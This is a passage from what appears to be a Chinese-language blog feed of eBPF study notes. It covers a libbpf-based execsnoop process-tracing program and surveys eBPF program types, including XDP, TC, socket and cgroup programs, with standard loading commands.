class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 引入脚手架头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;execsnoop.skel.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// C语言主函数</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 定义BPF程序和性能事件缓冲区</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">execsnoop_bpf</span> *<span class="title">skel</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">perf_buffer_opts</span> <span class="title">pb_opts</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">perf_buffer</span> *<span class="title">pb</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 设置调试输出函数</span></span><br><span class="line">    libbpf_set_print(libbpf_print_fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 增大 RLIMIT_MEMLOCK（默认值通常太小，不足以存入BPF映射的内容）</span></span><br><span class="line">    bump_memlock_rlimit();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 初始化BPF程序</span></span><br><span class="line">    skel = execsnoop_bpf__open();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 加载BPF字节码</span></span><br><span class="line">    err = execsnoop_bpf__load(skel);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5. 挂载BPF字节码到跟踪点</span></span><br><span class="line">    err = execsnoop_bpf__attach(skel);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6. 配置性能事件回调函数</span></span><br><span class="line">    pb_opts.sample_cb = handle_event;</span><br><span class="line">    pb = perf_buffer__new(bpf_map__fd(skel-&gt;maps.events), <span class="number">64</span>, &amp;pb_opts);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7. 从缓冲区中循环读取数据</span></span><br><span class="line">    <span class="keyword">while</span> ((err = perf_buffer__poll(pb, <span class="number">100</span>)) &gt;= <span class="number">0</span>) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，<code>execsnoop_</code>  开头的数据结构和函数都包含在脚手架头文件 <code>execsnoop.skel.h</code> 中。而具体到每一步的含义如下：</p><ul><li>第 1 步的调试输出函数中，可以调用 <code>printf()</code> 把调试信息输出到终端中。</li><li>第 2 步增大锁定内存限制 <code>RLIMIT_MEMLOCK</code> 是必要的，因为系统默认的锁定内存通常过小，无法满足 BPF 映射的需要。</li><li>第 3~5 步，直接调用脚手架头文件中的函数，加载 BPF 字节码并挂载到跟踪点。</li><li>第 6~7 步为性能事件设置回调函数，并从缓冲区中循环读取数据。注意，性能事件映射  <code>skel-&gt;maps.events</code>  也是 bpftool 自动帮你生成好的。</li></ul><p>接下来，在性能事件回调函数中，把数据格式转换为 <code>struct event</code>  格式之后，由于参数列表是使用  <code>\0</code>  来分割的，并不能直接向终端打印所有参数。所以，还需要把  <code>\0</code>  先替换为空格，然后再打印。完整的回调函数如下所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 性能事件回调函数(向终端中打印进程名、PID、返回值以及参数)</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">handle_event</span><span class="params">(<span class="type">void</span> *ctx, <span class="type">int</span> cpu, <span class="type">void</span> *data, __u32 data_sz)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">e</span> =</span> data;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%-16s %-6d %3d &quot;</span>, e-&gt;comm, e-&gt;pid, e-&gt;retval);</span><br><span class="line">    print_args(e);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印参数（替换&#x27;\0&#x27;为空格）</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">print_args</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> event *e)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> args_counter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; e-&gt;args_size &amp;&amp; args_counter &lt; e-&gt;args_count; i++) &#123;</span><br><span class="line">        <span class="type">char</span> c = e-&gt;args[i];</span><br><span class="line">        <span class="keyword">if</span> (c == <span class="string">&#x27;\0&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// 把&#x27;\0&#x27;替换为空格</span></span><br><span class="line">            args_counter++;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(c);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (e-&gt;args_count &gt; TOTAL_MAX_ARGS) &#123;</span><br><span class="line">        <span class="comment">// 过长的参数输出&quot;...&quot;替代</span></span><br><span class="line">        <span class="built_in">fputs</span>(<span class="string">&quot; ...&quot;</span>, <span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把上面的代码保存到  <code>execsnoop.c</code>  文件中，然后执行下面的命令，将其编译为可执行文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">clang -g -O2 -Wall -I . -c execsnoop.c -o execsnoop.o</span><br><span class="line">clang -Wall -O2 -g execsnoop.o -static -lbpf -lelf -lz -o execsnoop</span><br></pre></td></tr></table></figure><p>最后，执行 <code>execsnoop</code>，你就可以得到如下的结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ./execsnoop</span><br><span class="line">COMM             PID    RET ARGS</span><br><span class="line">sh               276871   0 /bin/sh -c <span class="built_in">which</span> ps</span><br><span class="line"><span class="built_in">which</span>            276872   0 /usr/bin/which ps</span><br></pre></td></tr></table></figure><p>你还可以直接把这个文件复制到开启了 BTF 的其他机器中，无需安装额外的 LLVM 开发工具和内核头文件，也可以直接执行。</p><p>如果命令失败，并且你看到如下的错误，这说明当前机器没有开启 BTF，需要重新编译内核开启 BTF 才可以运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to load and verify BPF skeleton</span><br></pre></td></tr></table></figure><blockquote><p>虽然这三种方法的步骤和实现代码各不相同，但实际上它们的实现逻辑都是类似的，无非就是找出跟踪点，然后在 eBPF 部分获取想要的数据并保存到 BPF 映射中，最后在用户空间程序中读取 BPF 映射的内容并输出出来。</p></blockquote><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在实际的应用中，这三种方法有不同的使用场景：</p><ul><li>bpftrace 通常用在<strong>快速排查和定位系统</strong>上，它支持用单行脚本的方式来快速开发并执行一个 eBPF 程序；</li><li>BCC 通常用在<strong>开发复杂的 eBPF 程序</strong>中，它内置的各种小工具也是目前应用最为广泛的 eBPF 小程序；</li><li>libbpf 是<strong>从内核中抽离出来的标准库</strong>，用它开发的 eBPF 程序可以直接分发执行，不再需要在每台机器上都安装 LLVM 和内核头文件。</li></ul><p>通常情况下，你可以用 bpftrace 或 BCC 做一些快速原型，验证你的设计思路是不是可行，然后再切换到 libbpf ，开发完善的 eBPF 程序后再去分发执行。这样，不仅 eBPF 程序运行得更快（无需编译步骤），还避免了在运行环境中安装开发工具和内核头文件。</p><p>在不支持 BTF 的机器中，如果不想在运行 eBPF 时依赖于 LLVM 编译和内核头文件，你还可以参考内核中的  BPF 示例，直接引用内核源码中的 <code>tools/lib/bpf/</code>  库，以及内核头文件中的数据结构，来开发 eBPF 程序。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;eBPF 内核跟踪，eBPF 学习（四）&lt;/p&gt;</summary>
    
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/categories/eBPF/"/>
    
    
    <category term="eBPF" scheme="https://drun1baby.github.io/tags/eBPF/"/>
    
  </entry>
  
  <entry>
    <title>eBPF 程序的触发机制及其应用场景</title>
    <link href="https://drun1baby.github.io/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/"/>
    <id>https://drun1baby.github.io/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/</id>
    <published>2023-08-06T05:53:33.000Z</published>
    <updated>2023-08-09T02:23:05.088Z</updated>
    
    <content type="html"><![CDATA[<p>各类 eBPF 程序的触发机制及其应用场景，eBPF 学习（三）</p><span id="more"></span><h1 id="各类-eBPF-程序的触发机制及其应用场景"><a href="#各类-eBPF-程序的触发机制及其应用场景" class="headerlink" title="各类 eBPF 程序的触发机制及其应用场景"></a>各类 eBPF 程序的触发机制及其应用场景</h1><p>在上一讲中曾也提到，并不是所有的辅助函数都可以在 eBPF 程序中随意使用，不同类型的 eBPF 程序所支持的辅助函数是不同的。</p><p>那么，eBPF 程序都有哪些类型，而不同类型的 eBPF 程序又有哪些独特的应用场景呢？今天，就一起来看看。</p><h2 id="几类-eBPF-程序"><a href="#几类-eBPF-程序" class="headerlink" title="几类 eBPF 程序"></a>几类 eBPF 程序</h2><p>eBPF 程序类型决定了一个 eBPF 程序可以挂载的事件类型和事件参数，这也就意味着，内核中不同事件会触发不同类型的 eBPF 程序。</p><p>根据内核头文件 <a class="link" href="https://elixir.bootlin.com/linux/v5.13/source/include/uapi/linux/bpf.h#L908">include&#x2F;uapi&#x2F;linux&#x2F;bpf.h<i class="fas fa-external-link-alt"></i></a> 中  bpf_prog_type 的定义，Linux 内核 v5.13 已经支持 30 种不同类型的 eBPF 程序（注意， <code>BPF_PROG_TYPE_UNSPEC</code> 表示未定义）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">bpf_prog_type</span> &#123;</span></span><br><span class="line">  BPF_PROG_TYPE_UNSPEC, <span class="comment">/* Reserve 0 as invalid program type */</span></span><br><span class="line">  BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">  BPF_PROG_TYPE_KPROBE,</span><br><span class="line">  BPF_PROG_TYPE_SCHED_CLS,</span><br><span class="line">  BPF_PROG_TYPE_SCHED_ACT,</span><br><span class="line">  BPF_PROG_TYPE_TRACEPOINT,</span><br><span class="line">  BPF_PROG_TYPE_XDP,</span><br><span class="line">  BPF_PROG_TYPE_PERF_EVENT,</span><br><span class="line">  BPF_PROG_TYPE_CGROUP_SKB,</span><br><span class="line">  BPF_PROG_TYPE_CGROUP_SOCK,</span><br><span class="line">  BPF_PROG_TYPE_LWT_IN,</span><br><span class="line">  BPF_PROG_TYPE_LWT_OUT,</span><br><span class="line">  BPF_PROG_TYPE_LWT_XMIT,</span><br><span class="line">  BPF_PROG_TYPE_SOCK_OPS,</span><br><span class="line">  BPF_PROG_TYPE_SK_SKB,</span><br><span class="line">  BPF_PROG_TYPE_CGROUP_DEVICE,</span><br><span class="line">  BPF_PROG_TYPE_SK_MSG,</span><br><span class="line">  BPF_PROG_TYPE_RAW_TRACEPOINT,</span><br><span class="line">  BPF_PROG_TYPE_CGROUP_SOCK_ADDR,</span><br><span class="line">  BPF_PROG_TYPE_LWT_SEG6LOCAL,</span><br><span class="line">  BPF_PROG_TYPE_LIRC_MODE2,</span><br><span class="line">  BPF_PROG_TYPE_SK_REUSEPORT,</span><br><span class="line">  BPF_PROG_TYPE_FLOW_DISSECTOR,</span><br><span class="line">  BPF_PROG_TYPE_CGROUP_SYSCTL,</span><br><span class="line">  BPF_PROG_TYPE_RAW_TRACEPOINT_WRITABLE,</span><br><span class="line">  BPF_PROG_TYPE_CGROUP_SOCKOPT,</span><br><span class="line">  BPF_PROG_TYPE_TRACING,</span><br><span class="line">  BPF_PROG_TYPE_STRUCT_OPS,</span><br><span class="line">  BPF_PROG_TYPE_EXT,</span><br><span class="line">  BPF_PROG_TYPE_LSM,</span><br><span class="line">  BPF_PROG_TYPE_SK_LOOKUP,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对于具体的内核来说，因为不同内核的版本和编译配置选项不同，一个内核并不会支持所有的程序类型。你可以在命令行中执行下面的命令，来查询当前系统支持的程序类型：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bpftool feature probe | grep program_type</span><br></pre></td></tr></table></figure><p>执行后，你会得到如下的输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">eBPF program_type socket_filter is available</span><br><span class="line">eBPF program_type kprobe is available</span><br><span class="line">eBPF program_type sched_cls is available</span><br><span class="line">eBPF program_type sched_act is available</span><br><span class="line">eBPF program_type tracepoint is available</span><br><span class="line">eBPF program_type xdp is available</span><br><span class="line">eBPF program_type perf_event is available</span><br><span class="line">eBPF program_type cgroup_skb is available</span><br><span class="line">eBPF program_type cgroup_sock is available</span><br><span class="line">eBPF program_type lwt_in is available</span><br><span class="line">eBPF program_type lwt_out is available</span><br><span class="line">eBPF program_type lwt_xmit is available</span><br><span class="line">eBPF program_type sock_ops is available</span><br><span class="line">eBPF program_type sk_skb is available</span><br><span class="line">eBPF program_type cgroup_device is available</span><br><span class="line">eBPF program_type sk_msg is available</span><br><span class="line">eBPF program_type raw_tracepoint is available</span><br><span class="line">eBPF program_type cgroup_sock_addr is available</span><br><span class="line">eBPF program_type lwt_seg6local is available</span><br><span class="line">eBPF program_type lirc_mode2 is NOT available</span><br><span class="line">eBPF program_type sk_reuseport is available</span><br><span class="line">eBPF program_type flow_dissector is available</span><br><span class="line">eBPF program_type cgroup_sysctl is available</span><br><span class="line">eBPF program_type raw_tracepoint_writable is available</span><br><span class="line">eBPF program_type cgroup_sockopt is available</span><br><span class="line">eBPF program_type tracing is NOT available</span><br><span class="line">eBPF program_type struct_ops is available</span><br><span class="line">eBPF program_type ext is NOT available</span><br><span class="line">eBPF program_type lsm is NOT available</span><br><span class="line">eBPF program_type sk_lookup is available</span><br></pre></td></tr></table></figure><p>在这些输出中，你可以看到当前内核支持 kprobe、xdp、perf_event 等程序类型，而不支持 ext、lsm 等程序类型。</p><p>根据具体功能和应用场景的不同，这些程序类型大致可以划分为三类：</p><ul><li>第一类是跟踪，即从内核和程序的运行状态中提取跟踪信息，来了解当前系统正在发生什么。</li><li>第二类是网络，即对网络数据包进行过滤和处理，以便了解和控制网络数据包的收发过程。</li><li>第三类是除跟踪和网络之外的其他类型，包括安全控制、BPF 扩展等等。</li></ul><p>接下来，我就带你一起分别看看，每一类 eBPF 程序都有哪些具体的类型，以及这些不同类型的程序都是由哪些事件触发执行的。</p><h2 id="跟踪类-eBPF-程序"><a href="#跟踪类-eBPF-程序" class="headerlink" title="跟踪类 eBPF 程序"></a>跟踪类 eBPF 程序</h2><p>先看第一类，也就是跟踪类 eBPF 程序。</p><p><strong>跟踪类 eBPF 程序主要用于从系统中提取跟踪信息，进而为监控、排错、性能优化等提供数据支撑</strong>。比如，我们前几讲中的 Hello World 示例就是一个 <code>BPF_PROG_TYPE_KPROBE</code> 类型的跟踪程序，它的目的是跟踪内核函数是否被某个进程调用了。</p><p>为了方便你查询，我把常见的跟踪类 BPF 程序的主要功能以及使用限制整理成了一个表格，你可以在需要时参考。</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/traceClass.png" class><p>这其中，KPROBE、TRACEPOINT 以及 PERF_EVENT 都是最常用的 eBPF 程序类型，大量应用于监控跟踪、性能优化以及调试排错等场景中。我们前几讲中提到的 <a class="link" href="https://github.com/iovisor/bcc">BCC<i class="fas fa-external-link-alt"></i></a>工具集，其中包含的绝大部分工具也都属于这个类型。</p><h2 id="网络类-eBPF-程序"><a href="#网络类-eBPF-程序" class="headerlink" title="网络类 eBPF 程序"></a>网络类 eBPF 程序</h2><p>看完跟踪类 eBPF 程序，我们再来看看网络类 eBPF 程序。</p><p><strong>网络类 eBPF 程序主要用于对网络数据包进行过滤和处理，进而实现网络的观测、过滤、流量控制以及性能优化等各种丰富的功能</strong>。根据事件触发位置的不同，网络类 eBPF 程序又可以分为 XDP（eXpress Data Path，高速数据路径）程序、TC（Traffic Control，流量控制）程序、套接字程序以及 cgroup 程序，下面我们来分别看看。</p><h2 id="XDP-程序"><a href="#XDP-程序" class="headerlink" title="XDP 程序"></a>XDP 程序</h2><p>XDP 程序的类型定义为 <code>BPF_PROG_TYPE_XDP</code>，它在<strong>网络驱动程序刚刚收到数据包时</strong>触发执行。由于无需通过繁杂的内核网络协议栈，XDP 程序可用来实现高性能的网络处理方案，常用于 DDoS 防御、防火墙、4 层负载均衡等场景。</p><p>你需要注意，XDP 程序并不是绕过了内核协议栈，它只是在内核协议栈之前处理数据包，而处理过的数据包还可以正常通过内核协议栈继续处理。你可以通过下面的图片（图片来自 iovisor.org）加深对  XDP 相对内核协议栈位置的理解：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/XDP.png" class><p>根据网卡和网卡驱动是否原生支持 XDP 程序，XDP 运行模式可以分为下面这三种：</p><ul><li>通用模式。它不需要网卡和网卡驱动的支持，XDP 程序像常规的网络协议栈一样运行在内核中，性能相对较差，一般用于测试；</li><li>原生模式。它需要网卡驱动程序的支持，XDP 程序在网卡驱动程序的早期路径运行；</li><li>卸载模式。它需要网卡固件支持 XDP 卸载，XDP 程序直接运行在网卡上，而不再需要消耗主机的 CPU 资源，具有最好的性能。</li></ul><p>无论哪种模式，XDP 程序在处理过网络包之后，都需要根据 eBPF 程序执行结果，决定数据包的去处。这些执行结果对应以下 5 种 XDP 程序结果码：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/FiveResultCodeXDP.png" class><p>通常来说，XDP 程序通过 <code>ip link</code> 命令加载到具体的网卡上，加载格式为：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eth1 为网卡名</span></span><br><span class="line"><span class="comment"># xdpgeneric 设置运行模式为通用模式</span></span><br><span class="line"><span class="comment"># xdp-example.o 为编译后的 XDP 字节码</span></span><br><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> dev eth1 xdpgeneric object xdp-example.o</span><br></pre></td></tr></table></figure><p>而卸载 XDP 程序也是通过 <code>ip link</code> 命令，具体参数如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ip <span class="built_in">link</span> <span class="built_in">set</span> veth1 xdpgeneric off</span><br></pre></td></tr></table></figure><p>除了 <code>ip link</code> 之外， BCC 也提供了方便的库函数，让我们可以在同一个程序中管理 XDP 程序的生命周期：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译XDP程序</span></span><br><span class="line">b = BPF(src_file=<span class="string">&quot;xdp-example.c&quot;</span>)</span><br><span class="line">fn = b.load_func(<span class="string">&quot;xdp-example&quot;</span>, BPF.XDP)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载XDP程序到eth0网卡</span></span><br><span class="line">device = <span class="string">&quot;eth0&quot;</span></span><br><span class="line">b.attach_xdp(device, fn, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他处理逻辑</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载XDP程序</span></span><br><span class="line">b.remove_xdp(device)</span><br></pre></td></tr></table></figure><h2 id="TC-程序"><a href="#TC-程序" class="headerlink" title="TC 程序"></a>TC 程序</h2><p>TC 程序的类型定义为 <code>BPF_PROG_TYPE_SCHED_CLS</code> 和 <code>BPF_PROG_TYPE_SCHED_ACT</code>，分别作为 <a class="link" href="https://tldp.org/HOWTO/Traffic-Control-HOWTO/index.html">Linux 流量控制<i class="fas fa-external-link-alt"></i></a> 的分类器和执行器。Linux 流量控制通过网卡队列、排队规则、分类器、过滤器以及执行器等，实现了对网络流量的整形调度和带宽控制。</p><p>下图（图片来自 linux-ip.net）展示了  HTB（Hierarchical Token Bucket，层级令牌桶）流量控制的工作原理：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/HTBucketOri.png" class><p>得益于内核 v4.4 引入的 <a class="link" href="https://docs.cilium.io/en/v1.8/bpf/#tc-traffic-control">direct-action<i class="fas fa-external-link-alt"></i></a> 模式，TC 程序可以直接在一个程序内完成分类和执行的动作，而无需再调用其他的 TC 排队规则和分类器，具体如下图所示：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/TCProgram.png" class><p>同 XDP 程序相比，TC 程序可以<strong>直接获取内核解析后的网络报文数据结构</strong> <code>sk_buff</code>（XDP 则是 <code>xdp_buff</code>），并且可在网卡的接收和发送两个方向上执行（XDP 则只能用于接收）。下面我们来具体看看  TC 程序的执行位置：</p><ul><li>对于接收的网络包，TC 程序在网卡接收（GRO）之后、协议栈处理（包括 IP 层处理和 iptables 等）之前执行；</li><li>对于发送的网络包，TC 程序在协议栈处理（包括 IP 层处理和 iptables 等）之后、数据包发送到网卡队列（GSO）之前执行。</li></ul><p>除此之外，由于 TC 运行在内核协议栈中，不需要网卡驱动程序做任何改动，因而可以挂载到任意类型的网卡设备（包括容器等使用的虚拟网卡）上。</p><p>同 XDP 程序一样，TC eBPF 程序也可以通过 Linux 命令行工具来加载到网卡上，不过相应的工具要换成 tc。你可以通过下面的命令，分别加载接收和发送方向的 eBPF 程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建 clsact 类型的排队规则</span></span><br><span class="line">sudo tc qdisc add dev eth0 clsact</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载接收方向的 eBPF 程序</span></span><br><span class="line">sudo tc filter add dev eth0 ingress bpf da obj tc-example.o sec ingress</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加载发送方向的 eBPF 程序</span></span><br><span class="line">sudo tc filter add dev eth0 egress bpf da obj tc-example.o sec egress</span><br></pre></td></tr></table></figure><h2 id="套接字程序"><a href="#套接字程序" class="headerlink" title="套接字程序"></a>套接字程序</h2><p>套接字程序用于过滤、观测或重定向套接字网络包，具体的种类也比较丰富。根据类型的不同，套接字 eBPF 程序可以挂载到套接字（socket）、控制组（cgroup ）以及网络命名空间（netns）等各个位置。你可以根据具体的应用场景，选择一个或组合多个类型的 eBPF 程序，去控制套接字的网络包收发过程。</p><p>这里，我把常见的套接字程序类型，以及它们的应用场景和挂载方法整理成了一个表格，你可以在需要时参考：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/socket.png" class><h2 id="cgroup-程序"><a href="#cgroup-程序" class="headerlink" title="cgroup 程序"></a>cgroup 程序</h2><p>cgroup 程序用于<strong>对 cgroup 内所有进程的网络过滤、套接字选项以及转发等进行动态控制</strong>，它最典型的应用场景是对容器中运行的多个进程进行网络控制。</p><p>cgroup 程序的种类比较丰富，我也帮你整理了一个表格，方便你在需要时查询：</p><img src="/2023/08/06/eBPF-%E7%A8%8B%E5%BA%8F%E7%9A%84%E8%A7%A6%E5%8F%91%E6%9C%BA%E5%88%B6%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF/cgroup.png" class><p>这些类型的 BPF 程序都可以通过 BPF 系统调用的 <code>BPF_PROG_ATTACH</code> 命令来进行挂载，并设置挂载类型为匹配的 <code>BPF_CGROUP_xxx</code> 类型。比如，在挂载 <code>BPF_PROG_TYPE_CGROUP_DEVICE</code> 类型的 BPF 程序时，需要设置 <code>bpf_attach_type</code> 为 <code>BPF_CGROUP_DEVICE</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">attr.target_fd = target_fd;            <span class="comment">// cgroup文件描述符</span></span><br><span class="line">attr.attach_bpf_fd = prog_fd;          <span class="comment">// BPF程序文件描述符</span></span><br><span class="line">attr.attach_type = BPF_CGROUP_DEVICE;  <span class="comment">// 挂载类型为BPF_CGROUP_DEVICE</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bpf(BPF_PROG_ATTACH, &amp;attr, <span 